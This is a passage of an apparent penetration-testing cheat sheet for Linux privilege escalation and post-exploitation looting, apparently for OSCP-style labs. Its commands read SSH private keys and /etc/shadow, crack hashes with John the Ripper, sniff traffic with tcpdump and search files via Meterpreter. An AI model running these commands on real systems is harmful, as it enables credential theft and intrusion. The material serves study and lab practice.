misconfiguration</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Binary with suid permission can be run by anyone, but when they are run they are run as root!</span></p><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Example programs:</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">nmap\nvim\nnano\n</pre><p><br></p><pre class=\"ql-syntax\" spellcheck=\"false\">find / -perm -u=s -type f <span class=\"hljs-number\">2</span>&gt;<span class=\"hljs-regexp\">/dev/</span><span class=\"hljs-literal\">null</span>\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Unmounted filesystems</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">mount -l\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Cronjob</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Look for anything that is owned by privileged user but writable for you</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">crontab -l\nls -alh /<span class=\"hljs-keyword\">var</span>/spool/cron\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /<span class=\"hljs-keyword\">var</span>/spool/cron/crontabs/root\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">SSH Keys</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Check all home directories</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">cat ~<span class=\"hljs-regexp\">/.ssh/</span>authorized_keys\ncat ~<span class=\"hljs-regexp\">/.ssh/i</span>dentity.pub\ncat ~<span class=\"hljs-regexp\">/.ssh/i</span>dentity\ncat ~<span class=\"hljs-regexp\">/.ssh/i</span>d_rsa.pub\ncat ~<span class=\"hljs-regexp\">/.ssh/i</span>d_rsa\ncat ~<span class=\"hljs-regexp\">/.ssh/i</span>d_dsa.pub\ncat ~<span class=\"hljs-regexp\">/.ssh/i</span>d_dsa\ncat /etc/ssh/ssh_config\ncat /etc/ssh/sshd_config\ncat /etc/ssh/ssh_host_dsa_key.pub\ncat /etc/ssh/ssh_host_dsa_key\ncat /etc/ssh/ssh_host_rsa_key.pub\ncat /etc/ssh/ssh_host_rsa_key\ncat /etc/ssh/ssh_host_key.pub\ncat /etc/ssh/ssh_host_key\n</pre><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Bad path configuration</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Require user interaction</span></p><p><br></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">----------------------------- LOOT LOOT LOOT LOOT ----------------------</span></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 20px;\">Loot</strong></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Checklist</strong></p><p><br></p><ul data-checked=\"false\"><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Proof:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Network secret:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Passwords and hashes:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Dualhomed:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Tcpdump:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Interesting files:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Databases:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">SSH-keys:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Browser:</span></li><li><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Mail:</span></li></ul><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Proof</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">/root/proof.txt\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Network secret</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">/root/network-secret.txt\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Passwords and hashes</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">cat /etc/passwd\ncat /etc/shadow\n\nunshadow passwd shadow &gt; unshadowed.txt\njohn --rules --wordlist=<span class=\"hljs-regexp\">/usr/share/wordlists/rockyou</span>.txt unshadowed.txt\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Dualhomed</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">ifconfig\nifconfig -a\narp -a\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Tcpdump</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">tcpdump -i any -s0 -w capture.pcap\ntcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X\ntcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Interesting files</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\"><span class=\"hljs-comment\">#Meterpreter</span>\nsearch -f *.txt\nsearch -f *.zip\nsearch -f *.doc\nsearch -f *.xls\nsearch -f config*\nsearch -f *.rar\nsearch -f *.docx\nsearch -f *.sql\n\n.<span class=\"hljs-symbol\">ssh:</span>\n.bash_history\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Databases</strong></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">SSH-Keys</strong></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Browser</strong></p><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">Mail</strong></p><pre class=\"ql-syntax\" spellcheck=\"false\">/<span class=\"hljs-keyword\">var</span>/mail\n/<span class=\"hljs-keyword\">var</span>/spool/mail\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">GUI</strong></p><p><span style=\"font-family: martel-sans; color: rgb(68, 68, 68); font-size: 16px;\">If there is a gui we want to check out the browser.</span></p><pre class=\"ql-syntax\" spellcheck=\"false\">echo $DESKTOP_SESSION\necho $XDG_CURRENT_DESKTOP\necho $GDMSESSION\n</pre><p><br></p><p><br></p><p><strong style=\"font-family: martel-sans; font-size: 24px; color: rgb(68, 68, 68);\">How to replicate:</strong></p>","color":"light-green"}],"payloads":[]}
